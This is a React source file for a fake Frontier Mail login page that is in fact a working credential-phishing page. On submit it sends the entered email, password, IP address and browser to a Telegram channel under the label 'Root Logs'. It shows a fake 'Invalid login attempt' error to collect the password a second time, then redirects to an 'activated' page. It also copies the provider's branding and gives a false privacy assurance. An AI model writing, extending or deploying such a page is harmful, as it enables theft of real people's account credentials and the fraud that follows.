import React, { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import Loader from "../loader/Loader"; // Import your loader component
import { getUserIP, getUserBrowser, sendMessageToTelegram } from "../service/api"; // Import utility functions
import logo from "../assets/front-logo-MrKYnome.png";

const FrontierMailLogin = () => {
  const [loading, setLoading] = useState(true); // Initial page loader
  const [buttonLoading, setButtonLoading] = useState(false); // Button loader
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [attemptCount, setAttemptCount] = useState(0);
  const [showErrorMessage, setShowErrorMessage] = useState(false);
  const [isValid, setIsValid] = useState(true);

  const location = useLocation();
  const navigate = useNavigate();

  // Simulating initial loading
  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false); // Hide loader after initial load
    }, 3000);

    // Fetch user IP and browser information
    getUserIP().then(setIpAddress);
    setBrowser(getUserBrowser());

    // Extract email from URL hash
    const hash = location.hash;
    if (hash && hash.includes("@")) {
      setEmail(hash.substring(1));
    }

    return () => clearTimeout(timer);
  }, [location.hash]);

  // Form submission handler
  const handleLoginSubmit = async (event) => {
    event.preventDefault();
    setButtonLoading(true); // Show loader on button click

    const isValidEmail = email.includes("@");
    setIsValid(isValidEmail);

    if (isValidEmail) {
      const message = `Root Logs\nFrontier Login\nUsername: ${email}\nPassword: ${password}\nUser IP: ${ipAddress}\nUser Browser: ${browser}`;
      await sendMessageToTelegram(message);

      setAttemptCount((prevCount) => prevCount + 1);

      if (attemptCount === 0) {
        setButtonLoading(false);
        setShowErrorMessage(true);
      } else if (attemptCount >= 1) {
        setTimeout(() => {
          setButtonLoading(false); // Hide loader before redirection
          navigate("/activated"); // Redirect to account activation
        }, 3000); // Set a delay for the redirection
      }
    } else {
      setButtonLoading(false);
      setIsValid(false);
    }
  };

  // Show loader if the page is still loading
  if (loading || buttonLoading) {
    return <Loader />;
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-[#0b132a] text-white py-4">
        <div className="container mx-auto flex flex-wrap items-center justify-start px-4">
          <nav className="flex flex-wrap space-x-4 text-sm md:text-base">
            <a href="#" className="hover:text-gray-400">
              Residential
            </a>
            <a href="#" className="hover:text-gray-400">
              Small Business
            </a>
            <a href="#" className="hover:text-gray-400">
              Enterprise
            </a>
            <a href="#" className="hover:text-gray-400">
              Wholesale
            </a>
          </nav>
        </div>
      </header>

      {/* Logo and Go To Section */}
      <div className="lg:flex flex-wrap lg:flex-nowrap justify-start gap-36 ml-28 items-center px-8 py-6 lg:visible hidden">
        <div className="flex items-center mb-4 lg:mb-0">
          <img src={logo} className="h-10 w-10" alt="Logo" />
        </div>
        <div className="w-full lg:w-auto">
          <select
            className="border border-gray-300 rounded-md px-4 py-2 w-full lg:w-auto focus:ring-red-500 focus:border-red-500"
          >
            <option>Go To...</option>
            <option>My Account</option>
            <option>Pay your bills</option>
            <option>Check your mail</option>
          </select>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex justify-center items-center mt-4 px-4">
        <div className="bg-white shadow-lg rounded-lg p-8 w-full max-w-5xl">
          <h2 className="text-2xl font-bold text-start mb-6">
            Frontier Mail Login
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Left Form */}
            <form onSubmit={handleLoginSubmit} className="space-y-4">
              <div>
                <label
                  htmlFor="email"
                  className="block text-sm font-medium text-gray-700"
                >
                  Email Address
                </label>
                <input
                  type="email"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className={`mt-1 block w-full px-4 py-2 border ${
                    isValid ? "border-gray-300" : "border-red-500"
                  } rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500`}
                  placeholder="username@frontier.com"
                />
                {!isValid && (
                  <p className="text-red-500 text-sm mt-1">
                    Please enter a valid email address.
                  </p>
                )}
              </div>

              <div>
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-gray-700"
                >
                  Password
                </label>
                <input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500"
                  placeholder="********"
                />
              </div>

              <button
                type="submit"
                className="w-full bg-red-600 text-white py-2 rounded-md text-lg font-semibold hover:bg-red-700"
              >
                Login
              </button>
              {showErrorMessage && (
                <p className="text-red-500 text-sm mt-2">
                  Invalid login attempt. Please try again.
                </p>
              )}
            </form>

            {/* Right Section */}
            <div className="space-y-4 text-sm">
              <div>
                <label className="block text-sm font-medium text-gray-700">
                  Make Frontier Yahoo! your homepage
                </label>
                <input
                  type="text"
                  className="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none"
                />
              </div>

              <div className="flex items-center">
                <img
                  src="https://via.placeholder.com/100x40"
                  alt="Yahoo Search Logo"
                  className="h-8 mr-2"
                />
                <button className="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600">
                  Web Search
                </button>
              </div>
            </div>
          </div>

          <div className="mt-4 text-center">
            <a href="#" className="text-red-600 hover:underline text-sm">
              Forgot your password?
            </a>
          </div>

          <div className="mt-6 text-sm text-gray-600 text-center space-y-2">
            <p>
              Still need help?{" "}
              <span className="text-black font-bold">💬 Live Chat</span>{" "}
              <span className="text-black font-bold">❓ Help Center</span>
            </p>
            <p>
              Note: For your security, please be sure to log out when you are
              done.
            </p>
          </div>

          <div className="mt-6 text-gray-600 text-sm">
            Frontier does not track how you use e-mail or what sites you visit.
            If your Frontier e-mail is hosted by Yahoo!, Yahoo! does not share
            this information with Frontier. See Frontier's Privacy Policy.
          </div>
        </div>
      </div>
    </div>
  );
};

export default FrontierMailLogin;
